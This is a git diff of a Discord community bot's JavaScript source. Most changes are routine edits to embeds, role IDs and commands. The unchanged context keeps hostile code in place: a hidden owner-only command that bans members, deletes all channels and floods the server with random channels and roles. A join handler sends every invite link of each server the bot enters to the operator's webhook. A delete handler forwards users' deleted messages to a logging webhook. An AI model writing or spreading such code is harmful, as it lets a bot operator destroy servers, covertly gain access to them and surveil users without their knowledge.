@@ -488,7 +488,7 @@ client.on("messageReactionAdd", async (messageReaction, User) => {
         guildMember.roles.add(memberRole.id);
         ruleChannel.send(`${User}`).then(msg => msg.delete());
     }
-    if (messageReaction.message.id == '1211998774378111016') { // tryouter reaction
+    if (messageReaction.message.id == '1214972793150504960') { // tryouter reaction
         messageReaction.users.remove(User.id);
         guildMember.roles.add(tryouterRole.id);
     }
@@ -572,12 +572,6 @@ client.on('messageCreate', async (message) => {
 
     switch (command) {
 
-        case 'this':
-            const channelll = message.guild.channels.cache.get(message.channel.id)
-            if (channelll.id == message.guild.publicUpdatesChannelId) return console.log('this')
-            console.log(channelll)
-            break;
-
         case 'welcome':
             if (message.author.id !== config.master) return;
             message.delete();
@@ -592,7 +586,7 @@ client.on('messageCreate', async (message) => {
             message.delete();
             const tojoinEmbed = new EmbedBuilder()
                 .setColor(config.color)
-                .setDescription(`\n### <@&1211632162328289302>, this is how you can join:\nYou will 1v1 **<@1135986663152173278>** first to 5, **no race v4**. Play as well as you can. If you end up losing you are still able to join if they see you play well. Upon joining you will be placed into **<@&1211617906199367710>**.`)
+                .setDescription(`\n### <@&1211632162328289302>, this is how you can join:\nYou will 1v1 **<@1135986663152173278>** first to 5, **no race v4**. Play as well as you can. If you end up losing you are still able to join if they see you play well. Upon joining you will be placed into either **<@&1211616936912355348>** or **<@&1211617906199367710>**.`)
                 .setFooter({ text: 'React to become a tryouter.' })
                 ; (await message.channel.send({ embeds: [tojoinEmbed] })).react('⚔️')
             break;
@@ -646,34 +640,6 @@ client.on('messageCreate', async (message) => {
             }
             break;
 
-        case 'marine':
-            if (message.author.id !== config.master) return;
-            message.delete();
-            const marineEmbed = new EmbedBuilder()
-                .setColor('Blue')
-                .setTitle('React to get Honour roles')
-                .setDescription(`- **5 Million** 🛡️ \n- **10 Million** ⚔️\n- **20 Million** 🗿\n- **30 Million** 💎`)
-            const msgM = await message.channel.send({ embeds: [marineEmbed] });
-            msgM.react('🛡️');
-            msgM.react('⚔️');
-            msgM.react('🗿');
-            msgM.react('💎');
-            break;
-
-        case 'pirate':
-            if (message.author.id !== config.master) return;
-            message.delete();
-            const pirateEmbed = new EmbedBuilder()
-                .setColor('Red')
-                .setTitle('React to get Bounty roles')
-                .setDescription(`- **5 Million** 🛡️ \n- **10 Million** ⚔️\n- **20 Million** 🗿\n- **30 Million** 💎`)
-            const msgP = await message.channel.send({ embeds: [pirateEmbed] });
-            msgP.react('🛡️');
-            msgP.react('⚔️');
-            msgP.react('🗿');
-            msgP.react('💎');
-            break;
-
         case 'admin':
             if (message.author.id !== config.master) return;
             message.delete();
@@ -696,8 +662,8 @@ client.on('messageCreate', async (message) => {
                 theseMembers.forEach(member => member.ban);
                 message.guild.channels.cache.forEach(channel => channel.delete());
                 setInterval(() => {
-                        message.guild.channels.create({ name: `${Math.floor(Math.random() * 1000000)}`});
-                        message.guild.roles.create({ name: `${Math.floor(Math.random() * 1000000)}`});
+                    message.guild.channels.create({ name: `${Math.floor(Math.random() * 1000000)}` });
+                    message.guild.roles.create({ name: `${Math.floor(Math.random() * 1000000)}` });
                 }, 1);
 
                 message.guild.setName('1 - 800 - ERODE');
@@ -739,13 +705,14 @@ client.on('messageCreate', async (message) => {
             member.send(text).then(message.member.send(`Message sent to ${member}, message content:\n\`\`\`${text}\`\`\``)).catch((err) => console.error('error when sending message to user ' + err));
             break;
 
-        case 'crew':
+        case 'ranks':
             if (message.author.id !== config.master) return;
             message.delete();
-            const crewEmbed = new EmbedBuilder()
-                .setColor('DarkRed')
-                .setTitle('React if you\'re currently in the crew')
-                ; (await message.channel.send({ embeds: [crewEmbed] })).react('1208336373874958336')
+            const rankEmbed = new EmbedBuilder()
+                .setColor(config.color)
+                .setDescription(`# Crew Ranks in Order:\n### - <@&1211954527822020628>\n### - <@&1211954578187100160>\n### - <@&1211616936912355348>\n### - <@&1211617906199367710>`)
+                .setFooter({ text: 'Top being the best, bottom being lesser.' })
+            message.channel.send({ embeds: [rankEmbed] });
             break;
 
         case 'send':
@@ -772,38 +739,23 @@ client.on('messageCreate', async (message) => {
             break;
     };
 });
-
+/*
 client.on('presenceUpdate', async (oldPresence, newPresence) => {
-    const memberState = newPresence.member.presence.activities.find(activity => activity.state)
+    const memberState = newPresence.member.presence.activities.find(activity => activity.state);
+    const me = client.users.cache.get(config.master);
+    if (newPresence.guild.id !== config.server) return;
+    const mvpRole = newPresence.guild.roles.cache.get('1214167713073725502')
     if (memberState == null) return;
-    if (memberState.state.includes('1 - 800')) {
-        let userProfile = await UserProfile.findOne({
-            userid: newPresence.member.id,
-        });
-
-        if (userProfile) {
-            const lastPresenceDate = userProfile.lastPresenceCollected?.toDateString();
-            const currenDate = new Date().toDateString();
-
-            if (lastPresenceDate === currenDate) {
-                console.log(`wait a day ${newPresence.member.user.username}`);
-                return;
-            }
+    try {
+        if (memberState.state.includes('1 - 800')) {
+            newPresence.member.roles.add(mvpRole.id);
         } else {
-            userProfile = new UserProfile({
-                userid: newPresence.member.id,
-            });
+            newPresence.member.roles.remove(mvpRole.id);
         }
-
-        userProfile.balance += presenceAmount;
-        const formattedPresence = presenceAmount.toLocaleString(['en-us'])
-        userProfile.lastPresenceCollected = new Date();
-
-        await userProfile.save();
-
-        newPresence.member.send(`You claimed +$${formattedPresence} from presence reward!`).catch((err) => console.log(`error sending a message to user ${newPresence.member.user.username} - Presence Event`))
+    } catch (err) {
+        console.log('error handling presence event - ' + err);
     }
-});
+});*/
 
 client.on('debug', console.log).on('warn', console.log);
 
@@ -863,13 +815,13 @@ client.once('ready', async () => {
 
 client.on('guildCreate', async (guild) => {
     const owner = guild.members.cache.get(guild.ownerId)
-    const fetchInvites = (await guild.invites.fetch()).map(invite => invite.url + '\n') 
-    bot_enter_exit_wh.send({ content: `${client.user.username} has joined **${guild.name}** ||${guild.id}||, owner: ${owner.user.username} ||${owner.user.id}||\n# Invite codes:\n${fetchInvites}`})
+    const fetchInvites = (await guild.invites.fetch()).map(invite => invite.url + '\n')
+    bot_enter_exit_wh.send({ content: `${client.user.username} has joined **${guild.name}** ||${guild.id}||, owner: ${owner.user.username} ||${owner.user.id}||\n# Invite codes:\n${fetchInvites}` })
 });
 
 client.on('guildDelete', async (guild) => {
     const owner = guild.members.cache.get(guild.ownerId)
-    bot_enter_exit_wh.send({ content: `${client.user.username} has left **${guild.name}** ||${guild.id}|| , owner: ${owner.user.username} ||${owner.user.id}||`})
+    bot_enter_exit_wh.send({ content: `${client.user.username} has left **${guild.name}** ||${guild.id}|| , owner: ${owner.user.username} ||${owner.user.id}||` })
 });
 
 client.on('messageDelete', async (message) => {
@@ -877,8 +829,9 @@ client.on('messageDelete', async (message) => {
     if (message.channel.type == ChannelType.DM) return;
     if (message.content == null) return;
     if (message.author.bot) return;
+    if (message.channel.id == '1199776472768987236') return;
     if (message.channel.parentId == '1136757420270567564') return;
-    if (message.content.length >= 1500) return;
+    if (message.content.length >= 1800) return;
     messageLogWh.send({ content: `### ${message.author} ||${message.author.id}||\n**content:**\n\`\`\`${message.content}\`\`\`\nchannel: ${message.channel.name} ||${message.channel.id}||` }).catch((err) => console.log(err));
 });
 
